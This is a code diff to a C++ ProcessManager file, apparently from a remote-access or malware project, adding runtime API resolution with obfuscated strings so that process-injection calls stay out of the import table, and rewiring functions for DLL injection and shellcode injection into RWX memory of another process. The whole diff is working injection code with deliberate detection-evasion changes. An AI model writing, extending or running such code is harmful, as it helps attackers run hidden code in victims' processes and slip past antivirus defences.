@@ -24,6 +24,34 @@ SOFTWARE.
 
 #include "ProcessManager.h"
 
+// Inject APIs resolved at runtime — VirtualAllocEx / WriteProcessMemory / CreateRemoteThread
+// do NOT appear in the static import table.
+static inline LPVOID dyn_VirtualAllocEx(HANDLE h, LPVOID a, SIZE_T s, DWORD t, DWORD p) {
+    using fn_t = LPVOID(WINAPI*)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);
+    static fn_t fn = (fn_t)GetProcAddress(
+        GetModuleHandleA(S("kernel32.dll").c_str()), S("VirtualAllocEx").c_str());
+    return fn ? fn(h,a,s,t,p) : nullptr;
+}
+static inline BOOL dyn_WriteProcessMemory(HANDLE h, LPVOID b, LPCVOID d, SIZE_T s, SIZE_T* w) {
+    using fn_t = BOOL(WINAPI*)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);
+    static fn_t fn = (fn_t)GetProcAddress(
+        GetModuleHandleA(S("kernel32.dll").c_str()), S("WriteProcessMemory").c_str());
+    return fn ? fn(h,b,d,s,w) : FALSE;
+}
+static inline HANDLE dyn_CreateRemoteThread(HANDLE h, LPSECURITY_ATTRIBUTES a, SIZE_T s,
+                                             LPTHREAD_START_ROUTINE f, LPVOID p, DWORD fl, LPDWORD id) {
+    using fn_t = HANDLE(WINAPI*)(HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
+    static fn_t fn = (fn_t)GetProcAddress(
+        GetModuleHandleA(S("kernel32.dll").c_str()), S("CreateRemoteThread").c_str());
+    return fn ? fn(h,a,s,f,p,fl,id) : nullptr;
+}
+static inline BOOL dyn_VirtualFreeEx(HANDLE h, LPVOID a, SIZE_T s, DWORD t) {
+    using fn_t = BOOL(WINAPI*)(HANDLE,LPVOID,SIZE_T,DWORD);
+    static fn_t fn = (fn_t)GetProcAddress(
+        GetModuleHandleA(S("kernel32.dll").c_str()), S("VirtualFreeEx").c_str());
+    return fn ? fn(h,a,s,t) : FALSE;
+}
+
 std::string ProcessManager::ProcessList() {
 	std::string list = "";
 	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -72,18 +100,19 @@ bool ProcessManager::InjectDLL(const char* procname, const char* dllname) {
 
 	HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
 
-	LPVOID DllAddr = VirtualAllocEx(h_process, NULL, _MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);  
+	LPVOID DllAddr = dyn_VirtualAllocEx(h_process, NULL, _MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (DllAddr == NULL)
 		return 0;
 
-	if (!(WriteProcessMemory(h_process, DllAddr, dllname, strlen(dllname), NULL)))
+	if (!(dyn_WriteProcessMemory(h_process, DllAddr, dllname, strlen(dllname), NULL)))
 		return false;
 
-	LPVOID LoadLibA = (LPVOID)GetProcAddress(GetModuleHandle("Kernel32"), "LoadLibraryA");                   
+	LPVOID LoadLibA = (LPVOID)GetProcAddress(
+		GetModuleHandleA(S("kernel32.dll").c_str()), S("LoadLibraryA").c_str());
 	if (LoadLibA == NULL)
 		return false;
 
-	HANDLE hThread = CreateRemoteThread(h_process, NULL, 0,                     
+	HANDLE hThread = dyn_CreateRemoteThread(h_process, NULL, 0,
 		(LPTHREAD_START_ROUTINE)LoadLibA, DllAddr, 0, NULL);
 	if (hThread == NULL)
 		return false;
@@ -91,10 +120,10 @@ bool ProcessManager::InjectDLL(const char* procname, const char* dllname) {
 	WaitForSingleObject(hThread, INFINITE);
 
 	DWORD exit_code;
-	GetExitCodeThread(hThread, &exit_code);											
+	GetExitCodeThread(hThread, &exit_code);
 
 	CloseHandle(hThread);
-	VirtualFreeEx(h_process, DllAddr, 0, MEM_RELEASE);
+	dyn_VirtualFreeEx(h_process, DllAddr, 0, MEM_RELEASE);
 	CloseHandle(h_process);                                                    
 
 	return true;
@@ -104,10 +133,10 @@ bool ProcessManager::InjectShell(DWORD pid, std::string shell) {
 	bool result = false;
 	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	
-	PVOID addr = VirtualAllocEx(hProc, 0, shell.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	
-	if (WriteProcessMemory(hProc, addr, shell.c_str(), shell.size(), 0)) {
-		if (CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)addr, 0, 0, 0) != 0) {
+	PVOID addr = dyn_VirtualAllocEx(hProc, 0, shell.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	if (dyn_WriteProcessMemory(hProc, addr, shell.c_str(), shell.size(), 0)) {
+		if (dyn_CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)addr, 0, 0, 0) != 0) {
 			result = true;
 		}
 	}
